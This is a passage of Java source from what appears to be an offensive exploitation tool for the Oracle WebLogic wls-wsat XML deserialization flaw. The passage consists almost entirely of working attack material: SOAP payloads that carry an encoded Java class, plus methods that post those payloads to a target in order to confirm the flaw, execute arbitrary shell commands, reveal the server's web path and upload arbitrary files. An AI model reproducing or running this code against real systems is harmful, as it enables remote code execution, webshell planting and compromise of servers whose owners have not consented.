    private static String UploadFile_VUL_UserPath = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n    <soapenv:Header>\n        <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n            <java>\n                <void class=\"sun.misc.BASE64Decoder\">\n\t\t\t\t<void method=\"decodeBuffer\" id=\"byte_arr\"><string>yv66vgAAADIBEgcAAgEAIGNvbS9zdXBlcmVhbS9leHBsb2l0cy9YbWxBUElUZXN0BwAEAQAQamF2YS9sYW5nL09iamVjdAEAAWIBACdMd2VibG9naWMvdXRpbHMvZW5jb2RlcnMvQkFTRTY0RGVjb2RlcjsBAAg8Y2xpbml0PgEAAygpVgEABENvZGUHAAsBACV3ZWJsb2dpYy91dGlscy9lbmNvZGVycy9CQVNFNjREZWNvZGVyCgAKAA0MAA4ACAEABjxpbml0PgkAAQAQDAAFAAYBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUKAAMADQEABHRoaXMBACJMY29tL3N1cGVyZWFtL2V4cGxvaXRzL1htbEFQSVRlc3Q7AQAHZ2V0UGF0aAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7CgABABkMABoAGwEAGGdldEh0dHBDb25uZWN0aW9uSGFuZGxlcgEAMygpTHdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvSHR0cENvbm5lY3Rpb25IYW5kbGVyOwoAHQAfBwAeAQAvd2VibG9naWMvc2VydmxldC9pbnRlcm5hbC9IdHRwQ29ubmVjdGlvbkhhbmRsZXIMACAAIQEAEWdldFNlcnZsZXRSZXF1ZXN0AQAwKClMd2VibG9naWMvc2VydmxldC9pbnRlcm5hbC9TZXJ2bGV0UmVxdWVzdEltcGw7CgAjACUHACQBACx3ZWJsb2dpYy9zZXJ2bGV0L2ludGVybmFsL1NlcnZsZXRSZXF1ZXN0SW1wbAwAJgAnAQAKZ2V0Q29udGV4dAEAMigpTHdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvV2ViQXBwU2VydmxldENvbnRleHQ7BwApAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIKACsALQcALAEALndlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvV2ViQXBwU2VydmxldENvbnRleHQMAC4ALwEADmdldFJvb3RUZW1wRGlyAQAQKClMamF2YS9pby9GaWxlOwoAMQAzBwAyAQAMamF2YS9pby9GaWxlDAA0ABcBAA9nZXRBYnNvbHV0ZVBhdGgKADYAOAcANwEAEGphdmEvbGFuZy9TdHJpbmcMADkAOgEAB3ZhbHVlT2YBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nOwoAKAA8DAAOAD0BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYIAD8BAAUvd2FyLwoAKABBDABCAEMBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsKACgARQwARgAXAQAIdG9TdHJpbmcIAEgBAAAHAEoBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAVaHR0cENvbm5lY3Rpb25IYW5kbGVyAQAxTHdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvSHR0cENvbm5lY3Rpb25IYW5kbGVyOwEAFHdlYkFwcFNlcnZsZXRDb250ZXh0AQAwTHdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvV2ViQXBwU2VydmxldENvbnRleHQ7AQANU3RhY2tNYXBUYWJsZQoAUQBTBwBSAQAQamF2YS9sYW5nL1RocmVhZAwAVABVAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7BwBXAQAbd2VibG9naWMvd29yay9FeGVjdXRlVGhyZWFkCgBWAFkMAFoAWwEADmdldEN1cnJlbnRXb3JrAQAdKClMd2VibG9naWMvd29yay9Xb3JrQWRhcHRlcjsKAAMAXQwAXgBfAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7CABhAQARY29ubmVjdGlvbkhhbmRsZXIKAGMAZQcAZAEAD2phdmEvbGFuZy9DbGFzcwwAZgBnAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwoAaQBrBwBqAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQMAGwAbQEADXNldEFjY2Vzc2libGUBAAQoWilWCgBpAG8MAHAAcQEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQANZXhlY3V0ZVRocmVhZAEAHUx3ZWJsb2dpYy93b3JrL0V4ZWN1dGVUaHJlYWQ7AQALd29ya0FkYXB0ZXIBABtMd2VibG9naWMvd29yay9Xb3JrQWRhcHRlcjsBAAVmaWVsZAEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAAxiYXNlNjREZWNvZGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwoACgB7DAB8AH0BAAxkZWNvZGVCdWZmZXIBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCCAB/AQAFVVRGLTgKADYAgQwADgCCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYHAIQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQADc3RyAQASTGphdmEvbGFuZy9TdHJpbmc7AQAQYmFzZTY0RGVjb2RlQnl0ZQEAEmdldFNlcnZsZXRSZXNwb25zZQEAMSgpTHdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvU2VydmxldFJlc3BvbnNlSW1wbDsKACMAiwwAjACJAQALZ2V0UmVzcG9uc2UBAAhyZXNwb25zZQEAL0x3ZWJsb2dpYy9zZXJ2bGV0L2ludGVybmFsL1NlcnZsZXRSZXNwb25zZUltcGw7BwCQAQAtd2VibG9naWMvc2VydmxldC9pbnRlcm5hbC9TZXJ2bGV0UmVzcG9uc2VJbXBsAQAEcGF0aAEACkV4Y2VwdGlvbnMKAAEAlAwAiACJCgCPAJYMAJcAmAEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7CgABAJoMABYAFwoAnACeBwCdAQATamF2YS9pby9QcmludFdyaXRlcgwAnwA9AQAFcHJpbnQBAAJ1cAgAogEAAToKADYApAwApQCmAQAFc3BsaXQBACcoTGphdmEvbGFuZy9TdHJpbmc7KVtMamF2YS9sYW5nL1N0cmluZzsKAAEAqAwAeAB5CACRCgA2AKsMAKwArQEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgoAAQCvDACHAH0KALEAswcAsgEAGHdlYmxvZ2ljL3V0aWxzL0ZpbGVVdGlscwwAtACCAQALd3JpdGVUb0ZpbGUIALYBAAt4bWxfdGVzdF9vawEABWJkYXRhAQAFZGF0YXMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQACb3ABAARkYXRhAQACW0IHALkBAANzYXkKADYAwAwAwQAXAQAEdHJpbQoANgDDDADEAMUBAAZsZW5ndGgBAAMoKUkIAMcBAAZ3aG9hbWkIAMkBAAdvcy5uYW1lCgDLAM0HAMwBABBqYXZhL2xhbmcvU3lzdGVtDADOAHkBAAtnZXRQcm9wZXJ0eQoANgDQDADRABcBAAt0b0xvd2VyQ2FzZQgA0wEAA3dpbgoANgDVDADWANcBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgcA2QEAE2phdmEvdXRpbC9BcnJheUxpc3QKANgADQgA3AEACS9iaW4vYmFzaAoA2ADeDADfAK0BAANhZGQIAOEBAAItYwgA4wEAB2NtZC5leGUIAOUBAAIvYwcA5wEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgoA5gDpDAAOAOoBABMoTGphdmEvdXRpbC9MaXN0OylWCgDmAOwMAO0A7gEAE3JlZGlyZWN0RXJyb3JTdHJlYW0BAB0oWilMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwoA5gDwDADxAPIBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwoAjwD0DAD1APYBABZnZXRTZXJ2bGV0T3V0cHV0U3RyZWFtAQA1KClMd2VibG9naWMvc2VydmxldC9pbnRlcm5hbC9TZXJ2bGV0T3V0cHV0U3RyZWFtSW1wbDsKAPgA+gcA+QEAEWphdmEvbGFuZy9Qcm9jZXNzDAD7APwBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07CgD+AQAHAP8BADF3ZWJsb2dpYy9zZXJ2bGV0L2ludGVybmFsL1NlcnZsZXRPdXRwdXRTdHJlYW1JbXBsDAEBAQIBAAt3cml0ZVN0cmVhbQEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgoAnAEEDAEFAAgBAAVmbHVzaAEAA2NtZAEAB2lzTGludXgBAAFaAQAFb3NUeXABAARjbWRzAQAVTGphdmEvdXRpbC9BcnJheUxpc3Q7AQAOcHJvY2Vzc0J1aWxkZXIBABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEABHByb2MBABNMamF2YS9sYW5nL1Byb2Nlc3M7AQAKU291cmNlRmlsZQEAD1htbEFQSVRlc3QuamF2YQAhAAEAAwAAAAEACgAFAAYAAAALAAgABwAIAAEACQAAACsAAgAAAAAAC7sAClm3AAyzAA+xAAAAAgARAAAABgABAAAALAASAAAAAgAAAAEADgAIAAEACQAAAC8AAQABAAAABSq3ABOxAAAAAgARAAAABgABAAAADgASAAAADAABAAAABQAUABUAAAACABYAFwABAAkAAACWAAMAAwAAAC8qtwAYTCvGACYrtgActgAiTbsAKFkstgAqtgAwuAA1twA7Ej62AEC2AESwTBJHsAABAAAAKgArAEkAAwARAAAAGgAGAAAAEQAFABIACQATABEAFAArABcALAAaABIAAAAgAAMAAAAvABQAFQAAAAUAJgBLAEwAAQARABoATQBOAAIATwAAAAcAAmsHAEkAAAIAGgAbAAEACQAAAKQAAgAEAAAAK7gAUMAAVkwrtgBYTSy2AFwSYLYAYk4txgASLQS2AGgtLLYAbsAAHbBMAbAAAQAAACcAKABJAAMAEQAAACIACAAAAB8ABwAgAAwAIQAWACIAGgAjAB8AJAAoACYAKQAqABIAAAAqAAQAAAArABQAFQAAAAcAIQByAHMAAQAMABwAdAB1AAIAFgASAHYAdwADAE8AAAAHAAJoBwBJAAACAHgAeQABAAkAAABlAAQAAwAAABW7ADZZsgAPK7YAehJ+twCAsE0SR7AAAQAAABAAEQCDAAMAEQAAAA4AAwAAAC8AEQAwABIAMgASAAAAFgACAAAAFQAUABUAAAAAABUAhQCGAAEATwAAAAYAAVEHAIMAAgCHAH0AAQAJAAAAWwACAAMAAAALsgAPK7YAerBNAbAAAQAAAAcACACDAAMAEQAAAA4AAwAAADYACAA3AAkAOQASAAAAFgACAAAACwAUABUAAAAAAAsAhQCGAAEATwAAAAYAAUgHAIMAAgCIAIkAAQAJAAAAdAABAAMAAAAVAUwqtwAYTSzGAAsstgActgCKTCuwAAAAAwARAAAAFgAFAAAAPQACAD4ABwA/AAsAQAATAEIAEgAAACAAAwAAABUAFAAVAAAAAgATAI0AjgABAAcADgBLAEwAAgBPAAAACwAB/QATBwCPBwAdAAEAkQAIAAIAkgAAAAQAAQBJAAkAAAA9AAIAAQAAAA8qtwCTtgCVKrcAmbYAm7EAAAACABEAAAAKAAIAAABGAA4ARwASAAAADAABAAAADwAUABUAAAABAJ8APQACAJIAAAAEAAEASQAJAAAARAACAAIAAAAMKrcAk7YAlSu2AJuxAAAAAgARAAAACgACAAAASgALAEsAEgAAABYAAgAAAAwAFAAVAAAAAAAMAIUAhgABAAEAoAA9AAIAkgAAAAQAAQBJAAkAAADiAAMABgAAAFIrEqG2AKNNLAMyTiosBDK3AKc6BBKpLbYAqpoAG7sAKFkqtwCZuAA1twA7GQS2AEC2AEQ6BCosBTK3AK46BRkFGQS4ALAqtwCTtgCVErW2AJuxAAAAAwARAAAAJgAJAAAATgAHAFAACwBRABQAUgAdAFQANQBWAD4AVwBFAFgAUQBZABIAAAA+AAYAAABSABQAFQAAAAAAUgC3AIYAAQAHAEsAuAC5AAIACwBHALoAhgADABQAPgCRAIYABAA+ABQAuwC8AAUATwAAAA4AAf4ANQcAvQcANgcANgABAL4APQACAJIAAAAEAAEASQAJAAABhgADAAgAAACmKiu3AKdMK8YADSu2AL+2AMKaAAYSxkwEPRLIuADKTi3GABEttgDPEtK2ANSZAAUDPbsA2Fm3ANo6BByZAB0ZBBLbtgDdVxkEEuC2AN1XGQQrtgDdV6cAGhkEEuK2AN1XGQQS5LYA3VcZBCu2AN1XuwDmWRkEtwDoOgUZBQS2AOtXGQW2AO86Biq3AJM6BxkHtgDzGQa2APe2AP0qtwCTtgCVtgEDsQAAAAMAEQAAAF4AFwAAAF0ABgBeABQAXwAXAGEAGQBiAB8AYwAvAGQAMQBnADoAaAA+AGkARgBqAE4AawBVAGwAWABtAGAAbgBoAG8AbwBxAHoAcgCBAHMAiAB0AI4AdQCbAHYApQB3ABIAAABSAAgAAACmABQAFQAAAAAApgEGAIYAAQAZAI0BBwEIAAIAHwCHAQkAhgADADoAbAEKAQsABAB6ACwBDAENAAUAiAAeAQ4BDwAGAI4AGACNAI4ABwBPAAAAEgAFFAL9ABkBBwA2/AAmBwDYFgABARAAAAACARE=</string>\n\t\t\t\t</void>\n\t\t\t</void>\n                <void class=\"org.mozilla.classfile.DefiningClassLoader\">\n                    <void method=\"defineClass\">\n                        <string>com.supeream.exploits.XmlAPITest</string>\n                        <object idref=\"byte_arr\"></object>\n                        <void method=\"newInstance\">\n                            <void method=\"up\" id=\"proc\">\n                                <string>%s</string>\n                            </void>\n                        </void>\n                    </void>\n                </void>\n            </java>\n        </work:WorkContext>\n    </soapenv:Header>\n    <soapenv:Body/>\n</soapenv:Envelope>";
    private static String Path_VUL = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n    <soapenv:Header>\n        <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n            <java>\n                <void class=\"sun.misc.BASE64Decoder\">\n\t\t\t\t<void method=\"decodeBuffer\" id=\"byte_arr\"><string>yv66vgAAADIBEgcAAgEAIGNvbS9zdXBlcmVhbS9leHBsb2l0cy9YbWxBUElUZXN0BwAEAQAQamF2YS9sYW5nL09iamVjdAEAAWIBACdMd2VibG9naWMvdXRpbHMvZW5jb2RlcnMvQkFTRTY0RGVjb2RlcjsBAAg8Y2xpbml0PgEAAygpVgEABENvZGUHAAsBACV3ZWJsb2dpYy91dGlscy9lbmNvZGVycy9CQVNFNjREZWNvZGVyCgAKAA0MAA4ACAEABjxpbml0PgkAAQAQDAAFAAYBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUKAAMADQEABHRoaXMBACJMY29tL3N1cGVyZWFtL2V4cGxvaXRzL1htbEFQSVRlc3Q7AQAHZ2V0UGF0aAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7CgABABkMABoAGwEAGGdldEh0dHBDb25uZWN0aW9uSGFuZGxlcgEAMygpTHdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvSHR0cENvbm5lY3Rpb25IYW5kbGVyOwoAHQAfBwAeAQAvd2VibG9naWMvc2VydmxldC9pbnRlcm5hbC9IdHRwQ29ubmVjdGlvbkhhbmRsZXIMACAAIQEAEWdldFNlcnZsZXRSZXF1ZXN0AQAwKClMd2VibG9naWMvc2VydmxldC9pbnRlcm5hbC9TZXJ2bGV0UmVxdWVzdEltcGw7CgAjACUHACQBACx3ZWJsb2dpYy9zZXJ2bGV0L2ludGVybmFsL1NlcnZsZXRSZXF1ZXN0SW1wbAwAJgAnAQAKZ2V0Q29udGV4dAEAMigpTHdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvV2ViQXBwU2VydmxldENvbnRleHQ7BwApAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIKACsALQcALAEALndlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvV2ViQXBwU2VydmxldENvbnRleHQMAC4ALwEADmdldFJvb3RUZW1wRGlyAQAQKClMamF2YS9pby9GaWxlOwoAMQAzBwAyAQAMamF2YS9pby9GaWxlDAA0ABcBAA9nZXRBYnNvbHV0ZVBhdGgKADYAOAcANwEAEGphdmEvbGFuZy9TdHJpbmcMADkAOgEAB3ZhbHVlT2YBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nOwoAKAA8DAAOAD0BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYIAD8BAAUvd2FyLwoAKABBDABCAEMBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsKACgARQwARgAXAQAIdG9TdHJpbmcIAEgBAAAHAEoBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAVaHR0cENvbm5lY3Rpb25IYW5kbGVyAQAxTHdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvSHR0cENvbm5lY3Rpb25IYW5kbGVyOwEAFHdlYkFwcFNlcnZsZXRDb250ZXh0AQAwTHdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvV2ViQXBwU2VydmxldENvbnRleHQ7AQANU3RhY2tNYXBUYWJsZQoAUQBTBwBSAQAQamF2YS9sYW5nL1RocmVhZAwAVABVAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7BwBXAQAbd2VibG9naWMvd29yay9FeGVjdXRlVGhyZWFkCgBWAFkMAFoAWwEADmdldEN1cnJlbnRXb3JrAQAdKClMd2VibG9naWMvd29yay9Xb3JrQWRhcHRlcjsKAAMAXQwAXgBfAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7CABhAQARY29ubmVjdGlvbkhhbmRsZXIKAGMAZQcAZAEAD2phdmEvbGFuZy9DbGFzcwwAZgBnAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwoAaQBrBwBqAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQMAGwAbQEADXNldEFjY2Vzc2libGUBAAQoWilWCgBpAG8MAHAAcQEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQANZXhlY3V0ZVRocmVhZAEAHUx3ZWJsb2dpYy93b3JrL0V4ZWN1dGVUaHJlYWQ7AQALd29ya0FkYXB0ZXIBABtMd2VibG9naWMvd29yay9Xb3JrQWRhcHRlcjsBAAVmaWVsZAEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAAxiYXNlNjREZWNvZGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwoACgB7DAB8AH0BAAxkZWNvZGVCdWZmZXIBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCCAB/AQAFVVRGLTgKADYAgQwADgCCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYHAIQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQADc3RyAQASTGphdmEvbGFuZy9TdHJpbmc7AQAQYmFzZTY0RGVjb2RlQnl0ZQEAEmdldFNlcnZsZXRSZXNwb25zZQEAMSgpTHdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvU2VydmxldFJlc3BvbnNlSW1wbDsKACMAiwwAjACJAQALZ2V0UmVzcG9uc2UBAAhyZXNwb25zZQEAL0x3ZWJsb2dpYy9zZXJ2bGV0L2ludGVybmFsL1NlcnZsZXRSZXNwb25zZUltcGw7BwCQAQAtd2VibG9naWMvc2VydmxldC9pbnRlcm5hbC9TZXJ2bGV0UmVzcG9uc2VJbXBsAQAEcGF0aAEACkV4Y2VwdGlvbnMKAAEAlAwAiACJCgCPAJYMAJcAmAEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7CgABAJoMABYAFwoAnACeBwCdAQATamF2YS9pby9QcmludFdyaXRlcgwAnwA9AQAFcHJpbnQBAAJ1cAgAogEAAToKADYApAwApQCmAQAFc3BsaXQBACcoTGphdmEvbGFuZy9TdHJpbmc7KVtMamF2YS9sYW5nL1N0cmluZzsKAAEAqAwAeAB5CACRCgA2AKsMAKwArQEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgoAAQCvDACHAH0KALEAswcAsgEAGHdlYmxvZ2ljL3V0aWxzL0ZpbGVVdGlscwwAtACCAQALd3JpdGVUb0ZpbGUIALYBAAt4bWxfdGVzdF9vawEABWJkYXRhAQAFZGF0YXMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQACb3ABAARkYXRhAQACW0IHALkBAANzYXkKADYAwAwAwQAXAQAEdHJpbQoANgDDDADEAMUBAAZsZW5ndGgBAAMoKUkIAMcBAAZ3aG9hbWkIAMkBAAdvcy5uYW1lCgDLAM0HAMwBABBqYXZhL2xhbmcvU3lzdGVtDADOAHkBAAtnZXRQcm9wZXJ0eQoANgDQDADRABcBAAt0b0xvd2VyQ2FzZQgA0wEAA3dpbgoANgDVDADWANcBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgcA2QEAE2phdmEvdXRpbC9BcnJheUxpc3QKANgADQgA3AEACS9iaW4vYmFzaAoA2ADeDADfAK0BAANhZGQIAOEBAAItYwgA4wEAB2NtZC5leGUIAOUBAAIvYwcA5wEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgoA5gDpDAAOAOoBABMoTGphdmEvdXRpbC9MaXN0OylWCgDmAOwMAO0A7gEAE3JlZGlyZWN0RXJyb3JTdHJlYW0BAB0oWilMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwoA5gDwDADxAPIBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwoAjwD0DAD1APYBABZnZXRTZXJ2bGV0T3V0cHV0U3RyZWFtAQA1KClMd2VibG9naWMvc2VydmxldC9pbnRlcm5hbC9TZXJ2bGV0T3V0cHV0U3RyZWFtSW1wbDsKAPgA+gcA+QEAEWphdmEvbGFuZy9Qcm9jZXNzDAD7APwBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07CgD+AQAHAP8BADF3ZWJsb2dpYy9zZXJ2bGV0L2ludGVybmFsL1NlcnZsZXRPdXRwdXRTdHJlYW1JbXBsDAEBAQIBAAt3cml0ZVN0cmVhbQEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgoAnAEEDAEFAAgBAAVmbHVzaAEAA2NtZAEAB2lzTGludXgBAAFaAQAFb3NUeXABAARjbWRzAQAVTGphdmEvdXRpbC9BcnJheUxpc3Q7AQAOcHJvY2Vzc0J1aWxkZXIBABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEABHByb2MBABNMamF2YS9sYW5nL1Byb2Nlc3M7AQAKU291cmNlRmlsZQEAD1htbEFQSVRlc3QuamF2YQAhAAEAAwAAAAEACgAFAAYAAAALAAgABwAIAAEACQAAACsAAgAAAAAAC7sAClm3AAyzAA+xAAAAAgARAAAABgABAAAALAASAAAAAgAAAAEADgAIAAEACQAAAC8AAQABAAAABSq3ABOxAAAAAgARAAAABgABAAAADgASAAAADAABAAAABQAUABUAAAACABYAFwABAAkAAACWAAMAAwAAAC8qtwAYTCvGACYrtgActgAiTbsAKFkstgAqtgAwuAA1twA7Ej62AEC2AESwTBJHsAABAAAAKgArAEkAAwARAAAAGgAGAAAAEQAFABIACQATABEAFAArABcALAAaABIAAAAgAAMAAAAvABQAFQAAAAUAJgBLAEwAAQARABoATQBOAAIATwAAAAcAAmsHAEkAAAIAGgAbAAEACQAAAKQAAgAEAAAAK7gAUMAAVkwrtgBYTSy2AFwSYLYAYk4txgASLQS2AGgtLLYAbsAAHbBMAbAAAQAAACcAKABJAAMAEQAAACIACAAAAB8ABwAgAAwAIQAWACIAGgAjAB8AJAAoACYAKQAqABIAAAAqAAQAAAArABQAFQAAAAcAIQByAHMAAQAMABwAdAB1AAIAFgASAHYAdwADAE8AAAAHAAJoBwBJAAACAHgAeQABAAkAAABlAAQAAwAAABW7ADZZsgAPK7YAehJ+twCAsE0SR7AAAQAAABAAEQCDAAMAEQAAAA4AAwAAAC8AEQAwABIAMgASAAAAFgACAAAAFQAUABUAAAAAABUAhQCGAAEATwAAAAYAAVEHAIMAAgCHAH0AAQAJAAAAWwACAAMAAAALsgAPK7YAerBNAbAAAQAAAAcACACDAAMAEQAAAA4AAwAAADYACAA3AAkAOQASAAAAFgACAAAACwAUABUAAAAAAAsAhQCGAAEATwAAAAYAAUgHAIMAAgCIAIkAAQAJAAAAdAABAAMAAAAVAUwqtwAYTSzGAAsstgActgCKTCuwAAAAAwARAAAAFgAFAAAAPQACAD4ABwA/AAsAQAATAEIAEgAAACAAAwAAABUAFAAVAAAAAgATAI0AjgABAAcADgBLAEwAAgBPAAAACwAB/QATBwCPBwAdAAEAkQAIAAIAkgAAAAQAAQBJAAkAAAA9AAIAAQAAAA8qtwCTtgCVKrcAmbYAm7EAAAACABEAAAAKAAIAAABGAA4ARwASAAAADAABAAAADwAUABUAAAABAJ8APQACAJIAAAAEAAEASQAJAAAARAACAAIAAAAMKrcAk7YAlSu2AJuxAAAAAgARAAAACgACAAAASgALAEsAEgAAABYAAgAAAAwAFAAVAAAAAAAMAIUAhgABAAEAoAA9AAIAkgAAAAQAAQBJAAkAAADiAAMABgAAAFIrEqG2AKNNLAMyTiosBDK3AKc6BBKpLbYAqpoAG7sAKFkqtwCZuAA1twA7GQS2AEC2AEQ6BCosBTK3AK46BRkFGQS4ALAqtwCTtgCVErW2AJuxAAAAAwARAAAAJgAJAAAATgAHAFAACwBRABQAUgAdAFQANQBWAD4AVwBFAFgAUQBZABIAAAA+AAYAAABSABQAFQAAAAAAUgC3AIYAAQAHAEsAuAC5AAIACwBHALoAhgADABQAPgCRAIYABAA+ABQAuwC8AAUATwAAAA4AAf4ANQcAvQcANgcANgABAL4APQACAJIAAAAEAAEASQAJAAABhgADAAgAAACmKiu3AKdMK8YADSu2AL+2AMKaAAYSxkwEPRLIuADKTi3GABEttgDPEtK2ANSZAAUDPbsA2Fm3ANo6BByZAB0ZBBLbtgDdVxkEEuC2AN1XGQQrtgDdV6cAGhkEEuK2AN1XGQQS5LYA3VcZBCu2AN1XuwDmWRkEtwDoOgUZBQS2AOtXGQW2AO86Biq3AJM6BxkHtgDzGQa2APe2AP0qtwCTtgCVtgEDsQAAAAMAEQAAAF4AFwAAAF0ABgBeABQAXwAXAGEAGQBiAB8AYwAvAGQAMQBnADoAaAA+AGkARgBqAE4AawBVAGwAWABtAGAAbgBoAG8AbwBxAHoAcgCBAHMAiAB0AI4AdQCbAHYApQB3ABIAAABSAAgAAACmABQAFQAAAAAApgEGAIYAAQAZAI0BBwEIAAIAHwCHAQkAhgADADoAbAEKAQsABAB6ACwBDAENAAUAiAAeAQ4BDwAGAI4AGACNAI4ABwBPAAAAEgAFFAL9ABkBBwA2/AAmBwDYFgABARAAAAACARE=</string>\n\t\t\t\t</void>\n\t\t\t</void>\n                <void class=\"org.mozilla.classfile.DefiningClassLoader\">\n                    <void method=\"defineClass\">\n                        <string>com.supeream.exploits.XmlAPITest</string>\n                        <object idref=\"byte_arr\"></object>\n                        <void method=\"newInstance\">\n                            <void method=\"path\">\n                            </void>\n                        </void>\n                    </void>\n                </void>\n            </java>\n        </work:WorkContext>\n    </soapenv:Header>\n    <soapenv:Body/>\n</soapenv:Envelope>";


    @Override
    public String checkVul(String url) {
        this.target = url;
        this.headers.put("Content-type", "text/xml");
        String payload = String.format(Check_VUL, "xml_test_ok");

        Response response = HttpTools.post(this.target + VULURL, payload, this.headers, "UTF-8");
        if (response.getText() != null && response.getText().contains("xml_test_ok")) {
            this.isVul = true;
            return "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞 \t O(∩_∩)O~";
        } else if (response.getError() != null) {
            return "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
        } else {
            return "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
        }

    }

    @Override
    public String exeCmd(String cmd, String encoding) {
        String payload = String.format(VUL_CMD, Tools.Base64Encode(cmd));
        this.headers.put("Content-type", "text/xml");
        Response response = HttpTools.post(this.target + VULURL, payload, headers, encoding);
        return response.getText();
    }

    @Override
    public String getWebPath() {
        this.headers.put("Content-type", "text/xml");
        Response response = HttpTools.post(this.target + VULURL, Path_VUL, headers, "UTF-8");
        return Tools.regReplace(response.getText());
    }

    @Override
    public String uploadFile(String fileContent, String filename, String platform) throws Exception {
        String op = "path";
        String respath = filename;
        this.headers.put("Content-type", "text/xml");

        if (!filename.contains("/")) {
            op = "file";
            respath = this.target + "/wls-wsat/" + filename;
        }

        String payload = String.format(UploadFile_VUL_UserPath, op + ":" + Tools.Base64Encode(filename) + ":" + Tools.Base64Encode(fileContent));

        Response response = HttpTools.post(this.target + VULURL, payload, headers, "UTF-8");

        String result = response.getText();

        if (result.contains("xml_test_ok")) {
            result = result + "  上传成功! " + respath;
        } else {
            result = "上传失败";
        }

        return result;
    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
